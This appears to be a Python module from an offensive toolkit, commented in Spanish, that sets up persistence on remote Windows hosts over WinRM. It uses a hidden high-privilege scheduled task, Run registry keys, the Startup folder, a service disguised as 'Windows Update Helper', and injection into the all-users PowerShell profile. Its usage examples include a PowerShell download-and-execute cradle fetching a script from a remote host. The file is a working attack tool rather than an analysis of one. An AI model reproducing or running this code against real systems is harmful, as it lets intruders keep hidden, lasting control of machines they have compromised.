# scripts/winrm/post/persistence.py
"""
Persistencia remota vía WinRM/PowerShell.

Métodos disponibles:
  - schtask    — tarea programada (Register-ScheduledTask)
  - registry   — clave Run/RunOnce en HKLM o HKCU
  - startup    — copia payload a carpeta de inicio del usuario
  - service    — crea e instala un servicio Windows (New-Service)
  - profile    — inyecta comando en $PROFILE de PowerShell

Uso:
  python lobera.py winrm -t 10.10.10.5 --script=persistence -u USER -p PASS --method schtask --exec "cmd.exe /c whoami" --persist-name MiTarea
  python lobera.py winrm -t 10.10.10.5 --script=persistence -u USER -p PASS --method registry --exec "C:\\Windows\\Temp\\shell.exe"
  python lobera.py winrm -t 10.10.10.5 --script=persistence -u USER -p PASS --method service --exec "C:\\Windows\\Temp\\shell.exe" --persist-name LoberaSvc
  python lobera.py winrm -t 10.10.10.5 --script=persistence -u USER -p PASS --method profile --exec "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.1/s.ps1')"
"""

from core.output import console
from core import session_db


# ── Helper WinRM ───────────────────────────────────────────────────────────────

def _winrm_session(target, user, password, ssl=False, port=None):
    """Devuelve una sesión WinRM autenticada."""
    import winrm
    scheme = "https" if ssl else "http"
    p = port or (5986 if ssl else 5985)
    return winrm.Protocol(
        endpoint=f"{scheme}://{target}:{p}/wsman",
        transport="ntlm",
        username=user,
        password=password,
        server_cert_validation="ignore",
    )


def _run_ps(proto, cmd_ps):
    """Ejecuta un bloque PowerShell y devuelve (stdout, stderr, rc)."""
    import winrm
    shell_id = proto.open_shell()
    cmd_id   = proto.run_command(
        "powershell.exe",
        ["-NonInteractive", "-NoProfile", "-EncodedCommand",
         __import__("base64").b64encode(cmd_ps.encode("utf-16-le")).decode()]
    )
    stdout, stderr, rc = proto.get_command_output(shell_id, cmd_id)
    proto.cleanup_command(shell_id, cmd_id)
    proto.close_shell(shell_id)
    return stdout.decode(errors="replace"), stderr.decode(errors="replace"), rc


# ── Métodos de persistencia ────────────────────────────────────────────────────

def _schtask(proto, payload, name, trigger):
    console.print(f"  [bold]Método:[/bold] Tarea programada → {name}")

    trigger_map = {
        "logon":   "New-ScheduledTaskTrigger -AtLogOn",
        "startup": "New-ScheduledTaskTrigger -AtStartup",
        "hourly":  "New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Hours 1) -Once -At (Get-Date)",
        "daily":   "New-ScheduledTaskTrigger -Daily -At '08:00'",
    }
    trig_ps = trigger_map.get(trigger, trigger_map["logon"])

    ps = f"""
$action  = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c {payload}'
$trigger = {trig_ps}
$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0
Register-ScheduledTask -TaskName '{name}' -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
Write-Output "OK"
"""
    out, err, rc = _run_ps(proto, ps)
    if "OK" in out or rc == 0:
        console.print(f"  [green]✓ Tarea creada: {name}[/green]")
        console.print(f"  [dim]Trigger: {trigger} | Payload: {payload}[/dim]")
        return True
    console.print(f"  [red]✗ Error: {err.strip() or out.strip()}[/red]")
    return False


def _registry(proto, payload, name, hive):
    console.print(f"  [bold]Método:[/bold] Registro Run → {hive}\\...\\Run\\{name}")

    key = (r"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
           if hive.upper() == "HKLM"
           else r"HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")

    ps = f"""
Set-ItemProperty -Path '{key}' -Name '{name}' -Value '{payload}' -Type String -Force
Write-Output "OK"
"""
    out, err, rc = _run_ps(proto, ps)
    if "OK" in out or rc == 0:
        console.print(f"  [green]✓ Clave de registro creada[/green]")
        console.print(f"  [dim]{key}\\{name} = {payload}[/dim]")
        return True
    console.print(f"  [red]✗ Error: {err.strip() or out.strip()}[/red]")
    return False


def _startup(proto, payload, name):
    console.print(f"  [bold]Método:[/bold] Carpeta de inicio → {name}")

    # Copia el binario/script a la carpeta Startup del usuario actual
    ps = f"""
$startup = [Environment]::GetFolderPath('Startup')
$dst = Join-Path $startup '{name}'
Copy-Item -Path '{payload}' -Destination $dst -Force
Write-Output "OK:$dst"
"""
    out, err, rc = _run_ps(proto, ps)
    if "OK:" in out or rc == 0:
        dst = out.strip().replace("OK:", "")
        console.print(f"  [green]✓ Archivo copiado a carpeta de inicio[/green]")
        console.print(f"  [dim]{dst}[/dim]")
        return True
    console.print(f"  [red]✗ Error: {err.strip() or out.strip()}[/red]")
    return False


def _service(proto, payload, name):
    console.print(f"  [bold]Método:[/bold] Servicio Windows → {name}")

    ps = f"""
New-Service -Name '{name}' -BinaryPathName '{payload}' -DisplayName 'Windows Update Helper' -StartupType Automatic -Description 'Gestiona actualizaciones de Windows'
Start-Service -Name '{name}'
Write-Output "OK"
"""
    out, err, rc = _run_ps(proto, ps)
    if "OK" in out or rc == 0:
        console.print(f"  [green]✓ Servicio creado e iniciado: {name}[/green]")
        console.print(f"  [dim]Binario: {payload}[/dim]")
        return True
    console.print(f"  [red]✗ Error: {err.strip() or out.strip()}[/red]")
    return False


def _profile(proto, payload, name):
    """Inyecta un comando en el $PROFILE de PowerShell (persiste en cada sesión PS)."""
    console.print(f"  [bold]Método:[/bold] PowerShell $PROFILE → {name}")

    ps = f"""
$marker = '# {name}'
$line   = '{payload}'
$prof   = $PROFILE.AllUsersAllHosts
if (-not (Test-Path $prof)) {{ New-Item -ItemType File -Path $prof -Force | Out-Null }}
$content = Get-Content $prof -Raw -ErrorAction SilentlyContinue
if ($content -notmatch [regex]::Escape($marker)) {{
    Add-Content -Path $prof -Value "`n$marker`n$line"
    Write-Output "OK"
}} else {{
    Write-Output "YA_EXISTE"
}}
"""
    out, err, rc = _run_ps(proto, ps)
    if "OK" in out:
        console.print(f"  [green]✓ Comando inyectado en $PROFILE[/green]")
        console.print(f"  [dim]Se ejecutará en cada sesión PowerShell de cualquier usuario[/dim]")
        return True
    if "YA_EXISTE" in out:
        console.print(f"  [yellow]! Marcador ya presente en $PROFILE[/yellow]")
        return True
    console.print(f"  [red]✗ Error: {err.strip() or out.strip()}[/red]")
    return False


# ── Script principal ───────────────────────────────────────────────────────────

class Script:
    NAME        = "persistence"
    DESCRIPTION = "Persistencia remota vía WinRM: schtask, registro, startup, servicio, $PROFILE"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target   = str(self.target.ip)
        user     = getattr(args, "user",         None) or (self.creds.username if self.creds else None)
        password = getattr(args, "password",     "") or (self.creds.password if self.creds else "")
        method   = getattr(args, "method",       "schtask") or "schtask"
        payload  = getattr(args, "exec",         None)
        name     = getattr(args, "persist_name", "WindowsUpdate")
        hive     = getattr(args, "hive",         "HKLM")
        trigger  = getattr(args, "trigger",      "logon")
        ssl      = getattr(args, "ssl",          False)
        port     = getattr(args, "port",         None)

        if not user:
            console.print("[red]Falta -u USER[/red]")
            return

        console.print(f"  [bold]Persistencia WinRM[/bold] → {target}  método: {method}")

        try:
            proto = _winrm_session(target, user, password, ssl=ssl, port=port)
        except Exception as e:
            console.print(f"  [red]✗ No se pudo conectar por WinRM: {e}[/red]")
            return

        success = False

        if method == "schtask":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _schtask(proto, payload, name, trigger)

        elif method == "registry":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _registry(proto, payload, name, hive)

        elif method == "startup":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD (ruta al binario en el objetivo)[/red]"); return
            remote_name = name + ".exe" if not name.endswith(".exe") else name
            success = _startup(proto, payload, remote_name)

        elif method == "service":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _service(proto, payload, name)

        elif method == "profile":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            success = _profile(proto, payload, name)

        else:
            console.print(f"  [yellow]Métodos disponibles:[/yellow] schtask | registry | startup | service | profile")
            return

        if success:
            session_db.save_finding(
                category="persistence",
                data={
                    "target":  target,
                    "proto":   "winrm",
                    "method":  method,
                    "name":    name,
                    "payload": payload,
                }
            )
            console.print(f"\n  [bold green]✓ Persistencia establecida[/bold green]")
        else:
            console.print(f"\n  [bold red]✗ No se pudo establecer persistencia[/bold red]")
